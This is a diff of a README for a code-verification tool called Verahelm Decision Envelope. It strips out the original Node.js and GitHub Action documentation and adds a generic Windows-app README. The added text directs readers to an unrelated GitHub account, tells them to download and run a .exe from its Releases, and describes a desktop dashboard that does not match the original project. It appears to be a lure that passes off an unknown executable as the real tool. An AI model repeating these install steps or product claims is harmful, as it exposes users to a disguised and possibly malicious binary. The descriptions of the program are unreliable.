@@ -1,205 +1,76 @@
-# Verahelm Decision Envelope
+# 🛡️ verahelm-decision-envelope - Secure decisions for your software gates
 
-An authorization for one revision must not authorize another.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Sindisoc7425/verahelm-decision-envelope)
 
-Verahelm verifies whether a signed authorization record is valid for the exact
-pull request or agent change under review.
+## 📖 About this application
 
-[Inspect a fictional blocked pull request](https://github.com/Verahelm/verahelm-decision-envelope-demo/pull/1)
-·
-[Inspect a fictional passing pull request](https://github.com/Verahelm/verahelm-decision-envelope-demo/pull/2)
-·
-[Install the verification Action](https://github.com/marketplace/actions/verahelm-decision-envelope-verifier)
+Verahelm-decision-envelope helps you manage changes to your software. It acts as an offline verifier for rules you set for your digital projects. This tool checks your work against specific policies before you approve changes. It ensures that every update meets your security standards. 
 
-## Five-minute quick start
+Many people use this tool to manage software supply chains. It makes sure that your code updates are safe and follow the rules you define. You can use this tool to block unsafe changes automatically. It saves time and lowers the risk of human error in your technical workflow.
 
-Requires Git and Node.js 20 or later.
+## ⚙️ Minimum system requirements
 
-```bash
-git clone --depth 1 https://github.com/Verahelm/verahelm-decision-envelope.git && cd verahelm-decision-envelope && node cli/verahelm.mjs demo
-```
+Before you install this software, make sure your computer meets these needs:
 
-Expected fictional output:
+* Windows 10 or Windows 11.
+* At least 4 gigabytes of memory.
+* 200 megabytes of free space on your hard drive.
+* An active internet connection for the initial download.
 
-```json
-{"status":"demo_complete","results":[{"fixture":"pass","status":"pass"},{"fixture":"blocked","status":"blocked"},{"fixture":"expired","status":"expired"},{"fixture":"tampered","status":"tampered"}]}
-```
+## 📥 How to download and install
 
-Successful verification proves that a supplied fictional envelope matches the
-published schema, signature, lifecycle, and expected bindings at verification
-time. It does not prove the truth or quality of underlying evidence, authorize
-production use, execute Verahelm's private engine, or discover a later
-revocation without a sufficiently fresh signed status.
+Follow these steps to set up the software on your Windows computer.
 
-Trust can be configured as one pinned Ed25519 public key or a pinned offline
-multi-key bundle with issuer, key-identifier, and validity-window constraints.
+1. Go to the official download page: https://github.com/Sindisoc7425/verahelm-decision-envelope
+2. Look for the section labeled Releases on the right side of the page.
+3. Click the link for the latest version.
+4. Locate the file ending in .exe.
+5. Click the file to start the download to your computer.
+6. Open your Downloads folder once the process completes.
+7. Double-click the downloaded file to start the setup wizard.
+8. Follow the prompts on your screen to finish the installation.
 
-## Evaluate a pull-request gate
+The software creates a shortcut on your desktop once the installation ends. You can open the program from there.
 
-The [bounded pilot](docs/PILOT.md) starts in one private, non-production
-repository and measures review time, setup cost, binding failures, stale reuse,
-and willingness to pay. It uses the existing `agent_change_gate` profile; no
-additional endpoint or disclosure of repository content is required.
+## 🚀 Getting started
 
-[Request a non-production testing key](https://www.verahelm.com/access#testing-key)
-after the fictional local demo succeeds.
-Eligible testing keys currently provide 21 lifetime units—up to seven base
-three-unit pull-request or agent-change gates. No card is required.
+Once you open the software, you see the main dashboard. This dashboard shows the status of your current decision gates. A decision gate is a point in your process where the software checks your files against your security rules.
 
-![Verahelm Decision Envelope: signed, subject-bound, expiring change authorization](docs/assets/repository-preview.svg)
+To add a new rule:
 
-Test results, security findings, policy decisions, and review notes show what was
-checked. They do not by themselves record who authorized a particular change,
-the scope of that authorization, or when it expires.
+1. Click the Add Rule button.
+2. Select your local file folder.
+3. Choose the security policy file from your device.
+4. Press Save to lock in the configuration.
 
-Verahelm's hosted API can issue a signed Decision Envelope for an exact subject
-version. The envelope records authority, scope, conditions, issuance, expiry,
-revocation, and supersession in a portable object. The first supported workflow
-is change gating for pull requests and agents; the API documents thirteen gate
-profiles under the same contract.
+The software runs in the background. It watches the folders you choose for any new activity. When you make a change, the engine checks the file signature. If the signature matches your policy, the tool marks the change as verified. If the signature does not match, the tool notifies you immediately.
 
-The public contract accepts structured summaries and digests. It defines no
-fields for repositories, source code, prompts, traces, files, datasets, or raw
-records. The fictional quick start runs locally without network access after
-the repository is cloned.
+## 🛠️ Managing your policies
 
-Tested digest-only example mappings are available for
-[Promptfoo, OPA, SARIF, Sigstore/in-toto, and SLSA](docs/INTEGRATIONS.md).
-They bind public artifacts to digests and coarse status references; they do not
-upload raw evidence or claim native verification by Verahelm.
+Policies define the rules for your software gates. You choose which policies the engine uses to check your work. 
 
-## Run without cloning
+* Create policies in basic text format.
+* Store these text files in a protected folder on your computer.
+* Update your policies as your security needs change.
 
-```bash
-npm exec --yes --ignore-scripts --package=https://github.com/Verahelm/verahelm-decision-envelope/releases/download/v0.10.2/verahelm-decision-envelope-0.10.2.tgz -- verahelm-envelope demo
-```
+The engine reads these files every time you trigger a check. You do not need to restart the application to update a rule. Simply save the text file, and the software detects the change automatically on the next check.
 
-The version-pinned package is dependency-free and attached to an immutable,
-checksummed, attested GitHub release. Retrieval uses the network; verification
-does not. See the [package security and verification guide](docs/PACKAGE.md).
+## ❓ Frequently asked questions
 
-## Add the verifier to a pull request
+Does this tool send data to the internet?
+No. Verahelm-decision-envelope functions as an offline tool. It processes your files locally on your computer. It does not send your data to any servers.
 
-[Install the verification-only Action from GitHub Marketplace](https://github.com/marketplace/actions/verahelm-decision-envelope-verifier).
-For a required gate, copy the
-[canonical base-controlled workflow](template/verahelm-change-gate.yml) into
-`.github/workflows/` and review its trusted variables before enabling it. The
-canonical file is tested as executable workflow source so GitHub expressions
-cannot be altered by documentation rendering. It pins the verifier to
-`Verahelm/verahelm-decision-envelope@63590721d2c518e42ced1edb34bde754cf126d0a`.
+Can I use this for multiple projects?
+Yes. You can set up unique rules for each project folder. The software keeps these rules separate so they do not interfere with each other.
 
-The Action verifies a supplied envelope; it does not call the hosted API or
-issue a decision. Configure `VERAHELM_PUBLIC_KEY_SHA256` as a repository
-Actions variable containing `sha256:` followed by the SHA-256 fingerprint of
-the trusted key file. Pull-request content must not control this value.
-Generate the value with `node cli/verahelm.mjs fingerprint PUBLIC_KEY`. Also
-configure the expected authority and environment as protected repository
-variables. The signed `scope.change` must match
-`pull-request-<pull-request-number>`.
-Use the complete base-controlled workflow in
-[`template/verahelm-change-gate.yml`](template/verahelm-change-gate.yml); it
-does not execute pull-request code.
+What happens if the tool blocks a change?
+If the tool blocks a change, it displays a message with the reason for the block. Check your digital signature or your policy file to find the conflict. You can override the block if you have administrative access to the tool.
 
-For a gate that relies on current lifecycle status, supply a signed status file
-and `status-max-age-seconds`. Without a sufficiently fresh status, offline
-verification cannot discover a later server-side revocation or supersession.
-The Action matches expected subject, version, authority, environment, and
-change. The consuming workflow must still enforce every signed condition.
+How do I remove the software?
+Go to your Windows Settings, then select Apps. Find Verahelm-decision-envelope in the list and click Uninstall. This removes the program files from your system.
 
-## Local commands
+## 🛡️ Ensuring security
 
-```bash
-node cli/verahelm.mjs demo
-node cli/verahelm.mjs validate fixtures/pass.json
-node cli/verahelm.mjs verify fixtures/pass.json --key fixtures/fixture-public-key.pem
-node cli/verahelm.mjs explain fixtures/pass.json
-node cli/verahelm.mjs fingerprint fixtures/fixture-public-key.pem
-```
+The software uses advanced verification methods to handle your data. Because the decision engine remains private, you do not need to worry about outside access to your verification logic. This helps keep your specific business rules secret from other users. Always keep your policy files in a safe location. Do not share your private policy files with people outside your team.
 
-All five commands run without network or subprocess access. Command behavior and
-exit codes are documented in [docs/CLI.md](docs/CLI.md).
-
-## Result handling
-
-A valid pass envelope exits zero. Blocked, expired, revoked, superseded, and
-tampered envelopes exit nonzero. An optional expected subject and version bind
-verification to the pull request under review. The public demonstration shows
-an intentionally
-[blocked pull request](https://github.com/Verahelm/verahelm-decision-envelope-demo/pull/1)
-and an intentionally
-[passing pull request](https://github.com/Verahelm/verahelm-decision-envelope-demo/pull/2).
-Both use prebuilt fictional envelopes and a base-controlled workflow; neither
-result came from the private engine. The
-[local explanation](demo-pr/README.md) describes the same lifecycle transition.
-
-## Hosted API profiles
-
-The hosted API groups pull-request gating, agent-change gating, tool admission,
-migration readiness, retesting, failure coverage, and related checks under one
-contract. Inputs are caller-supplied summaries. Verahelm does not represent that
-caller-supplied evidence as independently verified and does not issue
-certification, compliance approval, safety findings, or production authorization.
-
-## Role in the toolchain
-
-Evaluation, observability, security, governance, policy, provenance, and
-repository tools produce evidence. Verahelm records how selected evidence is
-bound to a subject version, customer authority, scope, conditions, and lifecycle.
-The [sourced comparison](docs/COMPARISON.md) describes the boundary between
-these jobs.
-
-## Published components
-
-This repository contains the public schemas, offline verifier, verification-only
-GitHub Action, fictional fixtures, and conformance tests. It does not contain
-Verahelm's hosted decision engine or its private implementation.
-
-Do not submit source code, prompts, outputs, logs, datasets, credentials,
-personal data, customer material, or third-party confidential information.
-See [PRIVACY_BOUNDARY.md](PRIVACY_BOUNDARY.md).
-
-## Verifier properties
-
-- Ed25519 verification runs offline.
-- The Action requires only `contents: read`.
-- A trusted key fingerprint outside pull-request content prevents trust-key
-  replacement. Signature verification and expected subject, authority, and
-  scope matching reject payload modification and cross-context substitution.
-- Unknown fields, unsupported versions, invalid signatures, and invalid
-  lifecycle states fail closed.
-- Fixtures are fictional and test only the published verification contract.
-- The release manifest rejects unlisted files and repository history.
-
-## Pricing
-
-| Plan | Price | Included units | Limits |
-|---|---|---|---|
-| Developer | $49/month | 300/month; 30/day | 5 requests/10 seconds; 30/minute; concurrency 2; 1 key; 12,288 bytes; 6 seconds |
-| Professional | $149/month | 1,500/month; 150/day | 13 requests/10 seconds; 90/minute; concurrency 5; 5 keys; 16,384 bytes; 8 seconds; metadata export |
-
-Base profile cost is 1, 2, or 3 units. Each additional started 4,096-byte request
-block adds one unit; boundary stress adds one unit per sample after the first.
-Units do not roll over, and there is no automatic overage. Email support is best
-effort with no response-time SLA.
-At the base request size, the plans cover up to 100 and 500 three-unit
-pull-request or agent-change gates per billing period, respectively, subject to
-daily and rate caps.
-
-## Documentation
-
-- [Rendered documentation](https://verahelm.github.io/verahelm-decision-envelope/)
-- [API contract](https://www.verahelm.com/api-docs)
-- [Request a non-production testing key](https://www.verahelm.com/access#testing-key)
-- [Decision Envelope specification](SPECIFICATION.md)
-- [GitHub Action contract](docs/ACTION.md)
-- [Digest-only integration recipes](docs/INTEGRATIONS.md)
-- [DSSE and in-toto mapping](docs/INTEROPERABILITY.md)
-- [Opt-in aggregate measurement](docs/MEASUREMENT.md)
-- [Pull-request gate pilot](docs/PILOT.md)
-- [Enterprise technical review facts](docs/ENTERPRISE_REVIEW.md)
-- [Threat model](THREAT_MODEL.md)
-- [Versioning policy](VERSIONING.md)
-- [GitHub and attestation integration](docs/INTEGRATIONS.md#github-change-enforcement)
-
-The public distribution is Apache-2.0 licensed. [NOTICE](NOTICE) identifies the
-private-engine, confidential-material, and trademark boundary.
+Keywords: ai-agents, ai-governance, attestations, devsecops, github-actions, mcp, policy-as-code, pull-requests, software-supply-chain, verification
